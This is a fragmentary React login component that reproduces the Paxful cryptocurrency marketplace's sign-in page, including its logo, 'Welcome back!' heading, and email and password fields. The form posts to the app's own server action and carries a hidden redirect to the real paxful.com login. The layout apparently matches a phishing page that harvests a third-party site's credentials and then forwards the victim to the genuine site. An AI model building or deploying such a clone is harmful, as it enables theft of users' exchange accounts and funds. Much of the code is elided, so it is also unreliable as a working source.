...
export default function Login() {
  return (
    <div className="flex flex-row">
      <div className="min-h-screen text-gray-500 bg-black max-[990px]:w-full min-[990px]:w-[498px] min-[990px]:shadow-[0_4px_8px_0_#FFFFFF40]">
        <div className="flex size-full flex-col space-y-6 px-4 py-6 md:px-10">
          <a href="https://paxful.com">
            <div className="flex h-6 flex-row items-center space-x-2.5 md:h-8 mb-4 text-white">
              <svg
              ...
              <svg
                ...
                fill="none"
                viewBox="0 0 103 34"
                className="h-full text-white md:inline"
              >
                <g fill="currentColor">
                  <path d="M102.625 0h-4.55v27.2h4.55z"></path>
                  <path
                    fill-rule="evenodd"
                  ...
                  <path
                    ...
                    clip-rule="evenodd"
                  ></path>
                  <path d="M62.617 7.49h-5.254l-4.484 6.232-4.484-6.231H43.14l7.111 9.88-7.111 9.882h5.254l4.484-6.231 4.484 6.231h5.254l-7.111-9.881z"></path>
                </g>
              </svg>
            </div>
          </a>
          <div className="invisible select-none opacity-0">
            <a
              className="relative flex cursor-pointer items-center justify-center whitespace-nowrap no-underline disabled:cursor-not-allowed [&amp;:where(a)]:inline-flex text-[14px]"
              href="index.html#"
            >
              <svg
                xmlns="http://www.w3.org/2000/svg"
          ...
          <div>
            <h2 className="mb-3 text-[32px] text-white font-semibold leading-10 tracking-[-4%]">
              Welcome back!
            </h2>
          ...
          <Form className="!mt-0 space-y-6" method="post">
            <input
              type="hidden"
              name="$ACTION_ID_44fea4d427d84a75e2ac93482bd08f6983e799eb"
            />
            <input type="hidden" name="next" value="https://paxful.com/login" />

            <label className="text-[15px] font-medium leading-none tracking-tight text-tertiary peer-disabled:cursor-not-allowed peer-disabled:opacity-70 flex flex-col gap-2">
              Email / Phone Number
              <div className="flex items-center rounded-[16px] font-medium !text-foreground placeholder:!text-tertiary dark:border-transparent bg-container h-14 p-4 text-[15px] leading-6 relative bg-gray-900">
                <input
                  className="bg-transparent text-gray-200 outline-0 placeholder:text-tertiary grow"
                  type="text"
                  id="username"
              ...
              <label className="text-[15px] font-medium leading-none tracking-tight text-tertiary peer-disabled:cursor-not-allowed peer-disabled:opacity-70 flex flex-col gap-2">
                ...
                <div className="w-full">
                  <div className="relative w-full">
                    <div className="flex items-center rounded-[16px] font-medium !text-foreground placeholder:!text-tertiary dark:border-transparent bg-container h-14 p-4 text-[15px] leading-6 relative bg-gray-900 pr-6">
                      <input
                        className="bg-transparent text-gray-200 outline-0 placeholder:text-tertiary grow"
                        type="password"
                        required
            ...
            <div className="mx-0">
              <button
                className="relative bg-lime-400 text-black flex cursor-pointer items-center justify-center whitespace-nowrap no-underline disabled:cursor-not-allowed [&amp;:where(a)]:inline-flex  bg-action-primary text-action-primary hover:border-action-primary-disabled hover:text-action-primary disabled:text-action-primary-disabled dark:disabled:border-action-primary-disabled dark:disabled:bg-action-primary-disabled h-12 rounded-[40px] px-8 text-[14px] font-semibold leading-6 w-full"
                type="submit"
              >
      ...
      <div className="h-screen w-[calc(100vw-498px)] grow overflow-hidden bg-container max-[990px]:hidden">
